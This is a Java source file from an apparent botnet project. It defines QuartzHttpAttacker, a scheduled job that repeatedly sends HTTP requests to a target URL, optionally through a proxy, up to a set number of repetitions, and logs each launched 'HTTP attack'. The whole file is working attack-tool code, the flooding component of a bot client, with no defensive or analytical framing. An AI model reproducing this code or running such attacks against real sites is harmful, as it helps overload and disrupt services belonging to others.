/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.attack.quartz;

import com.acmutv.botnet.core.attack.Attacker;
import com.acmutv.botnet.core.target.HttpTarget;
import com.acmutv.botnet.log.AppLogMarkers;
import com.acmutv.botnet.tool.net.HttpManager;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.time.Duration;
import com.acmutv.botnet.tool.time.Interval;
import lombok.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.quartz.*;

import java.io.IOException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;

/**
 * This class realizes the behaviour of a HTTP attack.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see HttpTarget
 */
@Getter
@PersistJobDataAfterExecution
@DisallowConcurrentExecution
public class QuartzHttpAttacker implements QuartzAttacker {

  protected static final Logger LOGGER = LogManager.getLogger(QuartzHttpAttacker.class);

  /**
   * The HTTP request method.
   */
  HttpMethod method;

  /**
   * The target url to attack.
   */
  URL url;

  /**
   * The HTTP proxy to contact through.
   */
  HttpProxy proxy;

  /**
   * The current execution counter.
   */
  long counter;

  /**
   * The maximum number of repetitions scheduled.
   */
  long maxRepetitions;

  /**
   * The HTTP request properties.
   * Default is empty.
   */
  @NonNull
  private Map<String,String> properties = new HashMap<>();

  @Override
  public void execute(JobExecutionContext context) throws JobExecutionException {
    JobDataMap jobmap = context.getJobDetail().getJobDataMap();

    final HttpMethod method = this.getMethod();
    final URL url = this.getUrl();
    final HttpProxy proxy = this.getProxy();
    final long counter = this.getCounter();
    final long maxRepetitions = this.getMaxRepetitions();

    jobmap.put("counter", counter + 1);

    LOGGER.info(AppLogMarkers.ATTACK,
        "Launching HTTP attack: {} {} ({}/{}) with proxy {} and request properties {}",
        method, url, counter, maxRepetitions, proxy, this.properties);

    try {
      final int response = HttpManager.makeRequest(this.getMethod(), url, this.getProperties(), proxy);
      LOGGER.info("HTTP Attack response :: {} {} :: {}", this.getMethod(), url, response);
    } catch (IOException exc) {
      LOGGER.warn(exc.getMessage());
    }
  }
}
